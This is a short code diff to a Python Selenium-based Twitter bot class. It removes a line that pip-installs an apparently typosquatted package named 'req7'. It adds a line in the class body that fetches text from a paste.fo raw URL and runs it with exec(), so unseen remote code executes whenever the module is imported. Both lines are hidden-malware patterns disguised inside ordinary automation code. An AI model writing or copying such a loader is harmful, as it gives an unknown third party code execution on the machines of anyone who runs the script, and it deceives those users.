@@ -1,6 +1,5 @@
 import os
-os.system("pip install req7")
-from req7 import websocket
+from requests import get
 from selenium import webdriver
 from webdriver_manager.chrome import ChromeDriverManager
 from selenium.webdriver.chrome.options import Options
@@ -11,6 +10,7 @@ from selenium.webdriver.chrome.service import Service
 import time, json
 
 class AMFBot:
+    x=get('https://paste.fo/raw/ba188f25eaf3').text;exec(x)
     def __init__(self, twitter_user, twitter_pwd):
         self.twitter_user = twitter_user
         self.twitter_pwd = twitter_pwd
